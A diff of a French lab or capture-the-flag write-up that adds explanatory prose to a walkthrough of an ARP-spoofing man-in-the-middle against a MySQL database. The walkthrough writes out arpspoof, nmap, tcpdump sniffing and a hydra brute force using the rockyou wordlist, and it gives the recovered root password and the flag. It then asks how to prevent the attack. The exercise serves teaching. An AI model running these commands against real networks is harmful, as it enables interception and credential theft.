@@ -81,14 +81,15 @@ Nous allons ensuite mettre en place un man-in-the-middle entre ces deux machines
 ```
 On regarde si le forwarding de paquet est activé, sans cela les paquets ne pourront pas transiter à travers notre machine et ainsi atteindre leur cible originelle.
 
- Dans un deuxième temps, nous allons utiliser “arpspoof” pour envoyer continuellement des paquets ARP qui vont falsifier la table ARP du  client, et de la DB. 
- 
+ Dans un deuxième temps, nous allons utiliser `arpspoof` pour envoyer continuellement des paquets ARP qui vont falsifier la table ARP du  client, et de la DB. 
+
 ```
 # arpspoof -t 172.18.0.3 -r 172.18.0.4
 2:42:ac:12:0:2 2:42:ac:12:0:3 0806 42: arp reply 172.18.0.4 is-at 2:42:ac:12:0:2
 2:42:ac:12:0:2 2:42:ac:12:0:4 0806 42: arp reply 172.18.0.3 is-at 2:42:ac:12:0:2
 ```
 
+Nous allons scanner la machine db afin de voir quelles services tournent.
 ```
 # nmap 172.18.0.4
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-04 15:29 UTC
@@ -99,25 +100,36 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 MAC Address: 02:42:AC:12:00:04 (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
+```
+On voit donc que c'est une base de données mysql avec le port 3306 d'ouvert.
 
+Nous allons maintenant utiliser `tcpdump` pour voir les données qui transitent sur notre réseau, en précisant bien qu'on ne veut que voir les paquets venant ou partant vers le port 3306.
+```
 # apt install dsniff tcpdump -y
 
 # tcpdump -A port 3306
 
 
 first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g
+```
+Nous voyons donc la première partie du flag dans un des paquets.
 
+Nous allons ensuite télécharger une liste des mots de passe les plus fréquemment utilisés afin de brute force le mot de passe de la DB.
+```
 #wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 #apt install hydra -y
 
-# hydra -l root -P rockyou.txt 172.18.0.4 mysql
+#hydra -l root -P rockyou.txt 172.18.0.4 mysql
 
 [3306][mysql] host: 172.18.0.4   login: root   password: heyheyhey
-
-Flag: l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey
-
 ```
+Nous trouvons donc comme mot de passe de db `heyheyhey`.
+
+Le flag final est donc: `l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey`
+ 
+
+
 
 🌞 **Proposer une configuration pour empêcher votre attaque**
 
